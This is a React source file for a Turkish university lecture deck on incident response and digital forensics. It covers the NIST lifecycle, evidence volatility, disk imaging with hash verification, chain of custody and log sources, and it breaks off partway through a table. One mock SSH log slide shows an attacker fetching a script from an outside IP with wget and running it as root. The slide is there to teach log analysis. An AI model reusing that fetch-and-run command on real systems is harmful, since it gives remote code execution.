"use client";

import {
  useCallback,
  useEffect,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Shield,
  ShieldCheck,
  Siren,
  Search,
  Microscope,
  Boxes,
  ScrollText,
  Terminal,
  ClipboardList,
  ClipboardCheck,
  Hash,
  Lock,
  AlertTriangle,
  Clock,
  Calendar,
  Target,
  Brain,
  Scale,
  FileSignature,
  Camera,
  Power,
  Network,
  ArrowRight,
  ChevronRight,
  ChevronLeft,
  Maximize2,
  Minimize2,
  Keyboard,
  Sparkles,
  Trash2,
  RefreshCw,
  type LucideIcon,
} from "lucide-react";
import "./styles.css";

/* ============================================================
   PRIMITIVES
   ============================================================ */

function SlideShell({
  children,
  bgPattern = true,
}: {
  children: ReactNode;
  bgPattern?: boolean;
}) {
  return (
    <div className="relative w-full h-full flex items-center justify-center px-12 py-16">
      {bgPattern && (
        <div className="absolute inset-0 sgbh-grid-bg pointer-events-none" />
      )}
      <div className="relative z-10 w-full max-w-6xl">{children}</div>
    </div>
  );
}

function Eyebrow({ children }: { children: ReactNode }) {
  return (
    <motion.div
      initial={{ opacity: 0, x: -10 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
      className="inline-flex items-center gap-3 mb-6 text-xs font-mono uppercase tracking-[0.25em] text-[#06b6d4]"
    >
      <span className="w-8 h-px bg-[#06b6d4]" />
      {children}
    </motion.div>
  );
}

function H1({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h1
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, ease: [0.22, 1, 0.36, 1] }}
      className={`text-5xl md:text-7xl font-bold tracking-tight leading-[1.05] text-white ${className}`}
    >
      {children}
    </motion.h1>
  );
}

function H2({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h2
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.1 }}
      className={`text-3xl md:text-5xl font-semibold tracking-tight text-white ${className}`}
    >
      {children}
    </motion.h2>
  );
}

function Sub({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.p
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className={`text-lg md:text-xl text-gray-400 leading-relaxed ${className}`}
    >
      {children}
    </motion.p>
  );
}

function FeatureCard({
  icon: Icon,
  title,
  desc,
  delay = 0,
  accent = "#06b6d4",
}: {
  icon: LucideIcon;
  title: string;
  desc: string;
  delay?: number;
  accent?: string;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-card sgbh-card-hover rounded-xl p-6 transition-all"
    >
      <div
        className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
        style={{ background: `${accent}15`, border: `1px solid ${accent}40` }}
      >
        <Icon className="w-6 h-6" style={{ color: accent }} />
      </div>
      <h3 className="text-lg font-semibold text-white mb-2">{title}</h3>
      <p className="text-sm text-gray-400 leading-relaxed">{desc}</p>
    </motion.div>
  );
}

function SectionDivider({
  num,
  total,
  title,
  subtitle,
  bgGradient,
  shadow,
  icon,
}: {
  num: string;
  total: string;
  title: string;
  subtitle: string;
  bgGradient: string;
  shadow: string;
  icon: ReactNode;
}) {
  return (
    <SlideShell bgPattern={false}>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
          className="inline-flex w-32 h-32 rounded-3xl items-center justify-center mb-8 sgbh-pulse"
          style={{ background: bgGradient, boxShadow: shadow }}
        >
          {icon}
        </motion.div>
        <Eyebrow>
          Bölüm {num} / {total}
        </Eyebrow>
        <H1>{title}</H1>
        <Sub className="mt-6 max-w-2xl mx-auto">{subtitle}</Sub>
      </div>
    </SlideShell>
  );
}

/* ============================================================
   TOPIC-SPECIFIC MOCKUPS
   ============================================================ */

function TerminalWindow({
  title,
  children,
}: {
  title: string;
  children: ReactNode;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.3, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-window-chrome w-full"
    >
      <div className="sgbh-window-bar flex items-center gap-2 px-4 py-2.5">
        <div className="flex gap-1.5">
          <span className="w-3 h-3 rounded-full bg-red-500/70" />
          <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
          <span className="w-3 h-3 rounded-full bg-green-500/70" />
        </div>
        <div
          className="flex items-center gap-2 ml-3 px-3 py-1 rounded text-[11px] font-mono flex-1 max-w-md mx-auto text-center justify-center"
          style={{ background: "#0d0d0d", color: "#67e8f9" }}
        >
          <span
            className="w-5 h-5 rounded-sm flex items-center justify-center text-[11px]"
            style={{ background: "linear-gradient(135deg,#06b6d4,#0891b2)", color: "white" }}
          >
            $_
          </span>
          <span>{title}</span>
        </div>
      </div>
      <div className="sgbh-terminal">{children}</div>
    </motion.div>
  );
}

/* IR yaşam döngüsü — NIST SP 800-61 6 fazlı halka */
function IRLifecycle() {
  const phases = [
    { n: "1", label: "Hazırlık", en: "Preparation", color: "#06b6d4", icon: ClipboardList },
    { n: "2", label: "Tespit & Analiz", en: "Detection & Analysis", color: "#22d3ee", icon: Search },
    { n: "3", label: "Sınırlama", en: "Containment", color: "#fbbf24", icon: Lock },
    { n: "4", label: "Yok Etme", en: "Eradication", color: "#f59e0b", icon: Trash2 },
    { n: "5", label: "Kurtarma", en: "Recovery", color: "#34d399", icon: RefreshCw },
    { n: "6", label: "Çıkarılan Dersler", en: "Lessons Learned", color: "#a78bfa", icon: Brain },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className="grid grid-cols-1 md:grid-cols-3 gap-3 max-w-5xl mx-auto"
    >
      {phases.map((p, i) => (
        <motion.div
          key={p.n}
          initial={{ opacity: 0, scale: 0.92 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.2 + i * 0.1 }}
          className="sgbh-card rounded-xl p-4 flex items-center gap-3"
        >
          <div
            className="w-11 h-11 rounded-lg flex items-center justify-center flex-shrink-0"
            style={{ background: `${p.color}18`, border: `1px solid ${p.color}55` }}
          >
            <p.icon className="w-5 h-5" style={{ color: p.color }} />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-mono" style={{ color: p.color }}>{p.n}</span>
              <span className="text-sm font-semibold text-white">{p.label}</span>
            </div>
            <div className="text-[10px] font-mono text-gray-500">{p.en}</div>
          </div>
        </motion.div>
      ))}
    </motion.div>
  );
}

/* Düzen-of-volatility: delillerin kaybolma hızına göre toplama sırası */
function OrderOfVolatility() {
  const rows = [
    { rank: "1", item: "CPU yazmaçları, cache", life: "nanosaniye", color: "#f87171" },
    { rank: "2", item: "RAM (bellek dökümü), çalışan süreçler, ağ bağlantıları", life: "saniye–dakika", color: "#fb923c" },
    { rank: "3", item: "Geçici dosyalar, swap / pagefile", life: "dakika–saat", color: "#fbbf24" },
    { rank: "4", item: "Disk (HDD/SSD) üzerindeki kalıcı veri", life: "günler–yıllar", color: "#34d399" },
    { rank: "5", item: "Uzak loglar, yedekler, arşiv ortamı", life: "aylar–yıllar", color: "#06b6d4" },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className="sgbh-card rounded-xl p-5 max-w-4xl mx-auto"
    >
      <div className="text-[10px] font-mono uppercase tracking-widest text-[#67e8f9] mb-4">
        En uçucudan en kalıcıya — RFC 3227 toplama sırası
      </div>
      <div className="space-y-2.5">
        {rows.map((r, i) => (
          <motion.div
            key={r.rank}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.25 + i * 0.1 }}
            className="flex items-center gap-3 rounded-lg px-3 py-2.5"
            style={{ background: `${r.color}10`, border: `1px solid ${r.color}33` }}
          >
            <span
              className="w-6 h-6 rounded-full flex items-center justify-center text-[11px] font-mono font-bold flex-shrink-0"
              style={{ background: `${r.color}22`, color: r.color }}
            >
              {r.rank}
            </span>
            <span className="text-sm text-gray-200 flex-1">{r.item}</span>
            <span className="font-mono text-[11px] whitespace-nowrap" style={{ color: r.color }}>
              {r.life}
            </span>
          </motion.div>
        ))}
      </div>
      <div className="mt-3 text-[11px] text-gray-500 flex items-start gap-2">
        <ArrowRight className="w-3.5 h-3.5 mt-0.5 flex-shrink-0 text-[#06b6d4]" />
        <span>
          Kural: önce kaybolacak olanı topla. RAM dökümünü almadan makineyi kapatırsan
          uçucu kanıtı geri dönülmez biçimde silersin.
        </span>
      </div>
    </motion.div>
  );
}

/* Log analiz penceresi — başarısız SSH brute-force sonrası başarılı giriş */
function LogAnalysisWindow() {
  const lines = [
    { ts: "Jun 26 02:14:07", host: "web01 sshd[2841]:", msg: "Failed password for invalid user admin from 203.0.113.66 port 51220", lvl: "warn" as const },
    { ts: "Jun 26 02:14:09", host: "web01 sshd[2843]:", msg: "Failed password for root from 203.0.113.66 port 51224", lvl: "warn" as const },
    { ts: "Jun 26 02:14:11", host: "web01 sshd[2845]:", msg: "Failed password for root from 203.0.113.66 port 51231", lvl: "warn" as const },
    { ts: "Jun 26 02:14:13", host: "web01 sshd[2847]:", msg: "Failed password for root from 203.0.113.66 port 51240", lvl: "warn" as const },
    { ts: "Jun 26 02:17:55", host: "web01 sshd[2902]:", msg: "Accepted password for deploy from 203.0.113.66 port 51999", lvl: "hit" as const },
    { ts: "Jun 26 02:18:31", host: "web01 sudo:", msg: "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.66/x.sh", lvl: "err" as const },
    { ts: "Jun 26 02:18:44", host: "web01 sudo:", msg: "deploy : USER=root ; COMMAND=/bin/bash x.sh", lvl: "err" as const },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.96, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-window-chrome w-full"
    >
      <div className="sgbh-window-bar flex items-center gap-2 px-4 py-2.5">
        <div className="flex gap-1.5">
          <span className="w-3 h-3 rounded-full bg-red-500/70" />
          <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
          <span className="w-3 h-3 rounded-full bg-green-500/70" />
        </div>
        <div
          className="flex items-center gap-2 ml-3 px-3 py-1 rounded text-[11px] flex-1 max-w-md mx-auto text-center justify-center font-mono"
          style={{ background: "#0d0d0d", color: "#67e8f9" }}
        >
          <ScrollText className="w-3.5 h-3.5" />
          <span>grep &apos;sshd&apos; /var/log/auth.log — kronolojik</span>
        </div>
      </div>
      <div className="sgbh-log">
        {lines.map((l, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.3 + i * 0.08 }}
            className={`sgbh-log-line px-2 py-0.5 rounded-sm ${l.lvl === "hit" ? "sgbh-log-hit" : ""}`}
          >
            <span className="sgbh-log-ts">{l.ts} </span>
            <span className="text-gray-400">{l.host} </span>
            <span
              className={
                l.lvl === "warn"
                  ? "sgbh-log-warn"
                  : l.lvl === "err"
                  ? "sgbh-log-err"
                  : "sgbh-log-info"
              }
            >
              {l.msg}
            </span>
          </motion.div>
        ))}
      </div>
      <div className="px-4 py-3 text-[11px] text-gray-400 border-t border-white/5 flex items-start gap-2">
        <AlertTriangle className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          Okuma: 4 başarısız deneme (brute-force), ardından{" "}
          <span className="text-white">02:17:55&apos;te başarılı giriş</span> — aynı IP&apos;den.
          Sonra <span className="text-[#f87171] font-mono">wget</span> ile dışarıdan betik indirip
          root olarak çalıştırılmış. Bu, tek satırlık bir &quot;hata&quot; değil; bir saldırı zinciri.
        </span>
      </div>
    </motion.div>
  );
}

/* Disk imaj + hash doğrulama terminali */
function ImagingTerminal() {
  return (
    <TerminalWindow title="ir@workstation:~ — adli imaj alma">
      <div>
        <span className="sgbh-term-prompt">ir@workstation</span>
        <span className="sgbh-term-dim">:~$</span>{" "}
        <span className="sgbh-term-cmd">sudo dd if=/dev/sdb of=/evidence/CASE-2026-118.dd bs=4M status=progress</span>
      </div>
      <div className="sgbh-term-dim">256000000000 bytes (256 GB) copied, 1841 s, 139 MB/s</div>
      <div className="sgbh-term-dim mt-1"># Önce kaynak diskin, sonra imajın özetini al — eşleşmeli</div>
      <div className="mt-1">
        <span className="sgbh-term-prompt">ir@workstation</span>
        <span className="sgbh-term-dim">:~$</span>{" "}
        <span className="sgbh-term-cmd">sha256sum /dev/sdb</span>
      </div>
      <div>
        <span className="sgbh-term-ok">a3f1c9e7b2...8d41</span>{" "}
        <span className="sgbh-term-dim">/dev/sdb</span>
      </div>
      <div className="mt-1">
        <span className="sgbh-term-prompt">ir@workstation</span>
        <span className="sgbh-term-dim">:~$</span>{" "}
        <span className="sgbh-term-cmd">sha256sum /evidence/CASE-2026-118.dd</span>
      </div>
      <div>
        <span className="sgbh-term-ok">a3f1c9e7b2...8d41</span>{" "}
        <span className="sgbh-term-dim">/evidence/CASE-2026-118.dd</span>
      </div>
      <div className="mt-1">
        <span className="sgbh-term-ok">[OK] Özetler aynı — imaj bit-bit kopyadır, bütünlük doğrulandı.</span>
      </div>
      <div className="sgbh-term-warn mt-1"># Bundan sonra TÜM analiz kopya üzerinde yapılır; orijinale dokunulmaz.</div>
      <div className="mt-2">
        <span className="sgbh-term-prompt">ir@workstation</span>
        <span className="sgbh-term-dim">:~$</span>{" "}
        <span className="sgbh-term-cmd">_</span>
        <span className="animate-pulse">█</span>
      </div>
    </TerminalWindow>
  );
}

/* ============================================================
   SLIDES
   ============================================================ */

const slides: Array<(active: boolean) => ReactNode> = [
  /* ───── 1. Kapak ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <Eyebrow>BVA 2205 · 12. Hafta · Güz Dönemi</Eyebrow>
        <H1>
          <span className="sgbh-shimmer">Olay Müdahalesi &amp; DFIR</span>
          <br />
          <span className="text-white/90">Kanıt zinciri ve log analizi</span>
        </H1>
        <Sub className="mt-8 max-w-2xl mx-auto">
          Saldırı oldu — şimdi ne yapacaksın? Soğukkanlı müdahale, kanıtı bozmadan
          toplama ve loglardan saldırı zincirini çıkarma.
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-12 max-w-3xl mx-auto">
          <FeatureCard
            icon={Siren}
            title="Incident Response"
            desc="NIST 6 fazlı yaşam döngüsü: hazırlık, tespit, sınırlama, yok etme, kurtarma, ders."
            delay={0.3}
            accent="#06b6d4"
          />
          <FeatureCard
            icon={Microscope}
            title="Dijital Adli Bilişim"
            desc="Disk/RAM imajı, hash doğrulama, kanıtın bütünlüğünü koruma."
            delay={0.45}
            accent="#f59e0b"
          />
          <FeatureCard
            icon={FileSignature}
            title="Chain of Custody"
            desc="Kanıt zinciri: kim, ne zaman, neyi devraldı — mahkemede geçerlilik."
            delay={0.6}
            accent="#a78bfa"
          />
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-12 inline-flex items-center gap-2 text-xs font-mono text-gray-500"
        >
          <Calendar className="w-3.5 h-3.5" />
          Çarşamba 13:30 — 17:00 · Uygulamalı lab (log analizi + imaj alma)
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 2. Köprü ───── */
  () => (
    <SlideShell>
      <Eyebrow>Köprü · önceki haftalardan bu haftaya</Eyebrow>
      <H2>Önce nasıl saldırıldığını gördük; şimdi saldırıdan sonrasını</H2>
      <Sub className="mt-3 max-w-3xl">
        Keşif, sızma ve kötü amaçlı yazılımları konuştuk. Hiçbir savunma %100 değildir;
        er ya da geç bir olay olur. Önemli olan o anki tepkidir: panik mi, yoksa planlı,
        kanıtı koruyan bir müdahale mi?
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-10">
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.2 }}
          className="sgbh-card-warn rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#f87171]">
            <AlertTriangle className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Yanlış refleks</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Makineyi hemen kapatmak (uçucu kanıt yok olur).</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Zararlı dosyaları silip &quot;temizledim&quot; demek.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Orijinal disk üzerinde araştırma yapmak.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Kim ne yaptı kaydetmeden müdahale etmek.</li>
          </ul>
        </motion.div>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.35 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#86efac]">
            <ShieldCheck className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Planlı müdahale</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Önce uçucu kanıtı topla (RAM, ağ, süreçler).</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Sınırla: izole et, ama izleri koru.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Kopya üzerinde analiz; orijinale dokunma.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Her adımı zaman damgasıyla kayda geçir.</li>
          </ul>
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 3. Bu dersin akışı ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bu dersin akışı</Eyebrow>
      <H2>Üç durak: müdahale → kanıt zinciri → log analizi</H2>
      <Sub className="mt-3 max-w-3xl">
        Önce olaya nasıl yapılandırılmış tepki verileceğini görüyoruz; sonra kanıtı
        mahkemede geçerli kılan zinciri kuruyoruz; en son loglardan saldırının izini sürüyoruz.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10">
        {[
          { range: "01", title: "Olay Müdahalesi", items: ["NIST 6 fazlı döngü", "Olay sınıflandırma", "Sınırlama stratejileri"], icon: Siren, accent: "#06b6d4" },
          { range: "02", title: "DFIR & Kanıt", items: ["Uçuculuk sırası", "Disk/RAM imajı + hash", "Chain of custody"], icon: Microscope, accent: "#f59e0b" },
          { range: "03", title: "Log Analizi", items: ["Kaynaklar & merkezîleştirme", "Zaman çizelgesi kurma", "SIEM & korelasyon"], icon: ScrollText, accent: "#34d399" },
        ].map((g, i) => (
          <motion.div
            key={g.title}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div className="flex items-center gap-3 mb-4">
              <div
                className="w-10 h-10 rounded-lg flex items-center justify-center"
                style={{ background: `${g.accent}18`, border: `1px solid ${g.accent}55` }}
              >
                <g.icon className="w-5 h-5" style={{ color: g.accent }} />
              </div>
              <div>
                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color: g.accent }}>Durak {g.range}</div>
                <div className="text-lg font-semibold text-white">{g.title}</div>
              </div>
            </div>
            <ul className="space-y-2 text-sm text-gray-400">
              {g.items.map((it) => (
                <li key={it} className="flex items-start gap-2">
                  <ChevronRight className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" style={{ color: g.accent }} />
                  <span>{it}</span>
                </li>
              ))}
            </ul>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 4. Bölüm 1 — Olay Müdahalesi ───── */
  () => (
    <SectionDivider
      num="01"
      total="03"
      title="Olay Müdahalesi (IR)"
      subtitle="Bir güvenlik olayı oluştuğunda izlenen yapılandırılmış süreç. Panik değil prosedür: NIST SP 800-61'in altı fazı."
      bgGradient="linear-gradient(135deg,#06b6d4,#0e7490)"
      shadow="0 30px 80px -20px rgba(6,182,212,0.6)"
      icon={<Siren className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 6. IR yaşam döngüsü ───── */
  () => (
    <SlideShell>
      <Eyebrow>NIST SP 800-61 · olay yaşam döngüsü</Eyebrow>
      <H2 className="mb-2">Altı faz — ve döngü baştan başlar</H2>
      <Sub className="max-w-3xl mb-6">
        Müdahale doğrusal değil döngüseldir: son fazda öğrenilenler ilk faza (hazırlık) geri besler.
        Sınırlama–yok etme–kurtarma kısmı çoğu zaman birkaç tur döner.
      </Sub>
      <IRLifecycle />
    </SlideShell>
  ),

  /* ───── 7. Sınırlama stratejileri ───── */
  () => (
    <SlideShell>
      <Eyebrow>Faz 3 · sınırlama (containment)</Eyebrow>
      <H2 className="mb-2">Yangını söndürmeden önce çevrele</H2>
      <Sub className="max-w-3xl mb-8">
        Amaç saldırının yayılmasını durdurmak — ama kanıtı yok etmeden. Yanlış sınırlama
        ya saldırıyı büyütür ya da delili siler.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {[
          { title: "Kısa vadeli", icon: Power, color: "#f87171", desc: "Etkilenen makineyi ağdan izole et (kabloyu çek / VLAN&apos;a al). Kapatma değil — izolasyon; RAM&apos;deki kanıt korunur." },
          { title: "Kanıt koruma", icon: Camera, color: "#fbbf24", desc: "İzole ederken ekran, çalışan süreç ve bağlantıların görüntüsünü al. Sınırlama ile delil arasında denge kur." },
          { title: "Uzun vadeli", icon: Network, color: "#34d399", desc: "Temiz sisteme geçiş, segmentasyon, kuralları sıkılaştırma. Yok etme ve kurtarmaya köprü." },
        ].map((c, i) => (
          <motion.div
            key={c.title}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.15 + i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
              style={{ background: `${c.color}18`, border: `1px solid ${c.color}55` }}
            >
              <c.icon className="w-6 h-6" style={{ color: c.color }} />
            </div>
            <div className="font-semibold text-white mb-2">{c.title}</div>
            <p className="text-sm text-gray-400 leading-relaxed" dangerouslySetInnerHTML={{ __html: c.desc }} />
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-6 sgbh-card rounded-lg px-4 py-3 text-xs text-gray-400 flex items-start gap-3 max-w-4xl"
      >
        <Power className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          <span className="text-white">Fişi çekme tartışması:</span> RAM&apos;de değerli kanıt varsa
          önce bellek dökümü alınır, sonra izolasyon. Bazı zararlılar kapanışta kendini siler — karar olaya göre verilir.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 8. Bölüm 2 — DFIR ───── */
  () => (
    <SectionDivider
      num="02"
      total="03"
      title="Adli Bilişim & Kanıt Zinciri"
      subtitle="Digital Forensics: kanıtı bozmadan toplama, koruma ve mahkemede savunulabilir kılma. Hash ile bütünlük, chain of custody ile aktarım."
      bgGradient="linear-gradient(135deg,#f59e0b,#b45309)"
      shadow="0 30px 80px -20px rgba(245,158,11,0.55)"
      icon={<Microscope className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 9. Order of volatility ───── */
  () => (
    <SlideShell>
      <Eyebrow>Adli ilke · uçuculuk sırası</Eyebrow>
      <H2 className="mb-2">Önce kaybolacak olanı topla</H2>
      <Sub className="max-w-3xl mb-6">
        Her kanıt türünün bir &quot;ömrü&quot; var. RAM elektrik kesilince saniyeler içinde yok olur;
        disk yıllarca kalır. Toplama sırası bu uçuculuğa göre belirlenir.
      </Sub>
      <OrderOfVolatility />
    </SlideShell>
  ),

  /* ───── 10. İmaj alma + hash ───── */
  () => (
    <SlideShell>
      <Eyebrow>Adli kopyalama · bit-bit imaj</Eyebrow>
      <H2 className="mb-2">Orijinale dokunma — kopyada çalış</H2>
      <Sub className="max-w-3xl mb-6">
        Adli analizin temel kuralı: diskin <span className="text-white">bit-bit kopyası</span> alınır,
        kaynak ile kopyanın <span className="text-[#67e8f9] font-mono">SHA-256</span> özeti karşılaştırılır.
        Özetler aynıysa kopya kanıt olarak güvenilirdir; tüm inceleme bu kopyada yapılır.
      </Sub>
      <ImagingTerminal />
    </SlideShell>
  ),

  /* ───── 11. Chain of custody tablosu ───── */
  () => (
    <SlideShell>
      <Eyebrow>Chain of Custody · kanıt zinciri formu</Eyebrow>
      <H2 className="mb-2">Kanıt el değiştirdikçe iz bırakır</H2>
      <Sub className="max-w-3xl mb-6">
        Kanıtın toplandığı andan mahkemeye kadar her aktarımı belgelenir: kim, ne zaman, kimden,
        hangi amaçla devraldı. Tek bir boşluk, kanıtın güvenilirliğini tartışmalı hâle getirir.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 0.6 }}
        className="sgbh-card rounded-xl p-1"
      >
        <table className="sgbh-coc">
          <thead>
            <tr>
              <th style={{ width: "16%" }}>Tarih / Saat</th>
              <th style={{ width: "20%" }}>Teslim eden</th>
              <th style={{ width: "20%" }}>Teslim alan</th>
              <th>Amaç / Not</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>26.06.2026 03:10</td>
              <td>A. Yılmaz (IR)</td>
              <td>— (toplama)</td>
              <td>web01 diski ele geçirildi · SHA-256: a3f1c9e7...8d41</td>
            </tr>
            <tr>
              <td>26.06.2026 04:35</td>
              <td>A. Yılmaz (IR)</td>
              <td>M. Demir (lab)</td>
              <td>İmaj alma için adli laboratuvara teslim</td>
            </tr>
            <tr>
              <td>26.06.2026 09:20</td>
              <td>M. Demir (lab)</td>
              <td>M. Demir (lab)</td>
              <td>Bit-bit imaj alındı · hash doğrulandı (eşleşti)</td>
            </tr>
            <tr>
              <td>28.06.2026 14:00</td>
              <td>M. Demir (lab)</td>
              <td>Delil odası</td>
              <td>Orijinal disk mühürlendi, kasaya kaldırıldı</td>
            </tr>
          </tbody>
        </table>
      </motion.div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.8 }}
        className="mt-4 sgbh-card-warn rounded-lg px-4 py-3 text-xs text-gray-300 flex items-start gap-3 max-w-4xl"
      >
        <Scale className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          <span className="text-white">Hukuki bağ:</span> Zincirde kopukluk olan kanıt mahkemede
          reddedilebilir. Usulüne uygun toplanmayan delil, teknik olarak doğru olsa bile hükme esas alınamayabilir.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 13. Bölüm 3 — Log Analizi ───── */
  () => (
    <SectionDivider
      num="03"
      total="03"
      title="Log Analizi"
      subtitle="Loglar, olayın kara kutusudur. Doğru toplanmış ve zaman çizelgesine dizilmiş loglar saldırının tüm hikâyesini anlatır."
      bgGradient="linear-gradient(135deg,#22c55e,#15803d)"
      shadow="0 30px 80px -20px rgba(34,197,94,0.55)"
      icon={<ScrollText className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 14. Log kaynakları ───── */
  () => (
    <SlideShell>
      <Eyebrow>Log kaynakları · nereye bakılır?</Eyebrow>
      <H2>Tek bir log yetmez — kaynakları birleştir</H2>
      <Sub className="mt-3 max-w-3xl">
        Saldırının tamamını görmek için farklı katmanların logları yan yana konur.
        Bir kaynakta görünmeyen, diğerinde ortaya çıkar.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 0.6 }}
        className="mt-6 sgbh-card rounded-xl p-1"
      >
        <table className="sgbh-tbl">
          <thead>
            <tr>
              <th style={{ width: "26%" }}>Kaynak</th>
              <th style={{ width: "30%" }}>Örnek konum / olay</th>
              <th>Ne anlatır?</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td className="text-white font-semibold">Kimlik doğrulama</td>
              <td><span className="font-mono text-[#67e8f9]">auth.log</span> · Windows Event 4625/4624</td>
              <td>Başarısız/başarılı girişler — brute-force ve ele geçirilen hesap.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Web sunucu</td>
              <td><span className="font-mono text-[#67e8f9]">access.log</span> · nginx/Apache</td>
              <td>İstekler, durum kodları — SQLi/dizin tarama/web shell izleri.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Güvenlik duvarı / ağ</td>
              <td>firewall · NetFlow · DNS</td>
              <td>Bağlantı yönü ve hacmi — C2 trafiği, veri sızdırma.</td>
            </tr>
